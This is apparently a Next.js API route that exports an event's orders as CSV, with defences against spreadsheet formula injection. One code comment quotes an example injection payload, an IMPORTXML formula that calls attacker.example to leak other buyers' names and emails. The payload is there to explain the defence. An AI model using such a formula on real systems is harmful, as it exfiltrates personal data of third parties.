import { listOrders } from '@/lib/orders';
import { requireOrganizerApi, requireOwnedEvent } from '../../../../auth';

export const dynamic = 'force-dynamic';

/**
 * A leading one of these makes Excel, Google Sheets and LibreOffice read the
 * cell as a FORMULA rather than as text.
 *
 * Two of the columns in this file — the buyer's name and email — are typed by
 * an anonymous stranger at checkout, and the file is opened by the organizer on
 * their own machine. A buyer who books a ticket under the name
 * `=IMPORTXML(CONCAT("https://attacker.example/?x",A2),"//a")` is writing a
 * program that runs when the organizer double-clicks the export, with the rest
 * of the sheet — every other buyer's name and email — available to send
 * outward. Quoting alone does not stop it: a quoted cell is still parsed as a
 * formula once the quotes are stripped.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * One CSV cell. Anything containing a quote, comma, or newline has to be quoted
 * and its quotes doubled, or a buyer called `Shrestha, Ram` silently becomes two
 * columns and shifts every field after it.
 *
 * A value that would start a formula is prefixed with an apostrophe, which is
 * the convention every spreadsheet understands as "this is text": it is not
 * shown in the cell, and the name still reads normally to the organizer.
 */
function cell(value: string | number | null | undefined): string {
  let text = value === null || value === undefined ? '' : String(value);
  if (FORMULA_LEAD.test(text)) text = `'${text}`;
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

const HEADERS = [
  'Order ID',
  'Reference',
  'Created (UTC)',
  'Status',
  'Buyer name',
  'Buyer email',
  'Tickets',
  'What they bought',
  'Total',
  'Currency',
  'Payment method',
  'Paid at (UTC)',
];

/**
 * Download this event's orders as a spreadsheet.
 *
 * The organizer's buyer list is theirs, so they must be able to take it out of
 * the platform rather than only look at it through our screens. Scoped to ONE
 * event the caller owns — the same guard chain as every other portal route, so
 * another organizer's id answers 404 rather than leaking that it exists.
 */
export async function GET(_req: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  try {
    const auth = await requireOrganizerApi();
    if (auth.failure) return auth.failure;
    const { organizer } = auth;

    const owned = requireOwnedEvent(organizer, id);
    if (owned.failure) return owned.failure;
    const { event } = owned;

    // Deliberately no query/filter: an export is the whole book, not the page
    // the organizer happened to be looking at. The limit is a sanity ceiling.
    const orders = listOrders({ eventId: event.id, limit: 1000 });

    const lines = [HEADERS.join(',')];
    for (const o of orders) {
      lines.push(
        [
          cell(o.id),
          cell(o.paymentReference),
          cell(o.createdAt),
          cell(o.status),
          cell(o.buyerName),
          cell(o.buyerEmail),
          cell(o.ticketCount),
          cell(o.itemsSummary),
          // Plain decimal, not a formatted money string: spreadsheets should
          // read this as a number they can sum.
          cell((o.totalCents / 100).toFixed(2)),
          cell(o.currency),
          cell(o.paymentMode),
          cell(o.paidAt ?? ''),
        ].join(',')
      );
    }

    // Excel assumes the local codepage unless a UTF-8 BOM says otherwise, which
    // is what turns Nepali and German names into mojibake on a colleague's PC.
    const csv = '﻿' + lines.join('\r\n') + '\r\n';

    const stamp = new Date().toISOString().slice(0, 10);
    const safeSlug = event.slug.replace(/[^a-z0-9-]/gi, '') || 'event';

    return new Response(csv, {
      headers: {
        'Content-Type': 'text/csv; charset=utf-8',
        'Content-Disposition': `attachment; filename="orders-${safeSlug}-${stamp}.csv"`,
        'Cache-Control': 'no-store, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
      },
    });
  } catch (e) {
    console.error(`GET /api/portal/events/${id}/orders/export failed:`, e);
    return new Response('Could not build the export. Please try again.', { status: 500 });
  }
}
